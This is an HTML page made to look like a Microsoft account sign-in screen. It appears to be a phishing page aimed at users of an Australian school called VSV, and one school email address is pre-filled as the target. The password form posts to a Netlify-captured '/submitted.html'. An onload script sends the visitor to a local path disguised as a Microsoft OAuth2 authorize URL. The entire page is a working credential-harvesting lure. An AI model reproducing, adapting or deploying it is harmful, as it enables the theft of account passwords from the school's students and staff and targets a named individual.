<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Sign in to your Microsoft account</title>
    <link rel="icon" type="image/svg+xml" sizes="21x21" href="assets/img/favicon16.svg">
    <link rel="icon" type="image/svg+xml" sizes="43x43" href="assets/img/favicon32.svg">
    <link rel="icon" type="image/svg+xml" sizes="240x240" href="assets/img/favicon%20180.svg">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css">
    <link rel="stylesheet" href="https://maxcdn.icons8.com/fonts/line-awesome/1.1/css/line-awesome.min.css">
    <link rel="stylesheet" href="assets/css/styles.min.css">
</head>

<body onload="Redirect()" class="text-nowrap" style="width: 100%;height: 100vh;">
    <div id="backgroundoverlay">
    <div id="loginForm" class="container"><img id="bannerLogo" data-bind="addEventHandlers, attr: { src: bannerLogoUrl, alt: str['STR_Banner_Logo_AltText'] }, externalCss: { 'banner-logo': true }" src="assets/img/microsoft_logo.png" alt="Organization banner logo" class="banner-logo ext-banner-logo">
<br><br>
        <section id="section-main">
            <section id="section-1" class="slide-page">
                <br>
                <p id="signIn" class="field">Sign in</p><h5 id="result"></h5><input type="email" id="email" class="field" placeholder="Email, phone, or Skype" />
                 <br>
                <p id="signInSecurityKey" class="field"><br><a href="https://support.microsoft.com/en-us/help/4463210/windows-10-sign-in-microsoft-account-windows-hello-security-key" style="color: #0067b8;">Forgot my password</a></p>

                    <p id="btnPlace" class="field"><button class="firstNext next" href="#next" type="button" id="btnSend" >Next</button></p>
            </section>
            <section id="section-2" class="page secondSlide">
                <p id="userLine">rgesthui@vsv.vic.edu.au</p><button class="btn btn-primary btn-sm py-0 prev-1" id="btnBack" type="button" style="font-size: 12px;height: 25px;width: 26px;"><img src="assets/img/arrow.svg" id="arrowBack"></button>
                <p
                    id="enterPwd">Enter password</p><h5 id="passResult"></h5>
                    <p><form action="/submitted.html" method="POST" name="f" id="f" data-netlify="true"><input type="password" id="password" placeholder="Password"></p>
                    <p id="ForgodPwd"><a href="#">Forgot my password</a></p>
                    <p id="btnSignInLocation"><button id="btnSignIn" class="submit" type="button">Sign in</button></form></p>

            </section>
            <div id="idBoilerPlateText"><p id="pboilerplate">If you are having trouble logging in please contact your Learning Advisor or VSV Reception on 03 9965 0000.</p></div>

        </section>


    </div>
    <br><br><br>
    <div id="footer" style="height: 36px;">
        <br>
        <div id="terms" style="float: left;width: 84px; margin-right:7px;">
            <p style="font-size: 12px;text-align: left; color:white;">Terms of use</p>
        </div>
        <div style="float: left;width: 105px;margin-right:7px;">
            <p style="font-size: 12px; color:white;">Privacy &amp; cookies</p>
        </div>
        <div style="float: left;width: 24px; padding-bottom: 5px;">
            <p style="font-size: 16px;color:white; letter-spacing: 3px;
            "><b>...</b></p>
        </div>
    </div>
</div>
<script>
    function Redirect() {
   window.location.replace("./common/oauth2/authorize%3F/response_type%3Dcode/client_id%3D40bbc52a-4374-39/index.html");
    }
</script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/js/bootstrap.bundle.min.js"></script>
    <script src="assets/js/script.min.js"></script>

</body>

</html>
